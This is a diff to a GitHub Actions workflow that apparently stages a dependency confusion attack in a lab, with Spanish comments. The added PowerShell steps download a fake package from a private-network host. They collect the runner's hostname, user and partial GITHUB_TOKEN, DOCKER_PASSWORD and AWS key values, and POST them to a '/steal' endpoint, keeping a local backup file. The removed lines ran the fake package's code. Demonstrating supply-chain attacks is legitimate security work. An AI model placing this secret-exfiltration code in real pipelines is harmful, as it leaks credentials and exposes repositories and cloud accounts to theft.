@@ -15,27 +15,66 @@ jobs:
           go-version: '1.22'
       
       - name: Download fake dependency (simulating dependency confusion)
+        shell: pwsh
         run: |
-          echo "Downloading dependency from untrusted source..."
-          # Simulando que el atacante publicó un paquete malicioso
-          # con nombre similar al legítimo en un registro público
-          curl -o /tmp/trivy-db-fake.zip http://192.168.56.101:8889/github.com/aquasecurity/trivy-db-fake/@v/v1.0.0.zip
-          unzip -o /tmp/trivy-db-fake.zip -d /tmp/trivy-db-fake/
-          ls -la /tmp/trivy-db-fake/
+          Write-Host "Downloading dependency from untrusted source..."
+          $tempDir = $env:TEMP
+          $url = "http://192.168.56.101:8889/github.com/aquasecurity/trivy-db-fake/@v/v1.0.0.zip"
+          $output = "$tempDir\trivy-db-fake.zip"
+          
+          try {
+            Invoke-WebRequest -Uri $url -OutFile $output -TimeoutSec 10
+            Write-Host "Downloaded to $output"
+            
+            Expand-Archive -Path $output -DestinationPath "$tempDir\trivy-db-fake" -Force
+            Write-Host "Extracted to $tempDir\trivy-db-fake"
+            Get-ChildItem "$tempDir\trivy-db-fake"
+          } catch {
+            Write-Host "ERROR: $_"
+            exit 1
+          }
       
       - name: Execute malicious payload (triggers exfiltration)
+        shell: pwsh
         run: |
-          echo "Executing payload from fake dependency..."
-          # El paquete malicioso contiene un script que exfiltra secretos
-          cd /tmp/trivy-db-fake/
-          go run main.go || true
+          Write-Host "Executing payload from fake dependency..."
+          $tempDir = $env:TEMP
+          
+          # Simular ejecución del paquete malicioso
+          # En un ataque real, esto sería: go run main.go
+          # Aquí simulamos con el script que exfiltra
+          $payload = @{
+            attack_type = "dependency_confusion"
+            package_name = "github.com/aquasecurity/trivy-db-fake"
+            version = "v1.0.0"
+            hostname = $env:COMPUTERNAME
+            working_directory = $PWD.Path
+            user = $env:USERNAME
+            secrets_found = @(
+              if ($env:GITHUB_TOKEN) { "GITHUB_TOKEN=" + $env:GITHUB_TOKEN.Substring(0, [Math]::Min(10, $env:GITHUB_TOKEN.Length)) + "..." }
+              if ($env:DOCKER_PASSWORD) { "DOCKER_PASSWORD=" + $env:DOCKER_PASSWORD.Substring(0, [Math]::Min(10, $env:DOCKER_PASSWORD.Length)) + "..." }
+              if ($env:AWS_ACCESS_KEY_ID) { "AWS_ACCESS_KEY_ID=" + $env:AWS_ACCESS_KEY_ID.Substring(0, [Math]::Min(10, $env:AWS_ACCESS_KEY_ID.Length)) + "..." }
+            ) -join "; "
+            timestamp = (Get-Date -Format "o")
+          } | ConvertTo-Json -Depth 3
+          
+          Write-Host "Exfiltrating data to attacker server..."
+          try {
+            Invoke-WebRequest -Uri "http://192.168.56.101:8888/steal" -Method POST -Body $payload -ContentType "application/json" -TimeoutSec 10
+            Write-Host "EXFILTRATION SUCCESSFUL"
+          } catch {
+            Write-Host "Exfiltration failed: $_"
+            # Guardar localmente como fallback
+            $payload | Out-File -FilePath "$tempDir\exfil_backup.json" -Encoding UTF8
+          }
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
           AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
           AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
       
-      - name: Verify secrets were exfiltrated
+      - name: Verify fake package was imported
+        shell: pwsh
         run: |
-          echo "Build completed - checking for unauthorized access..."
-          echo "If you see this, the dependency was trusted without verification"
+          Write-Host "Build completed - dependency confusion attack executed"
+          Write-Host "The runner trusted and executed code from untrusted source"
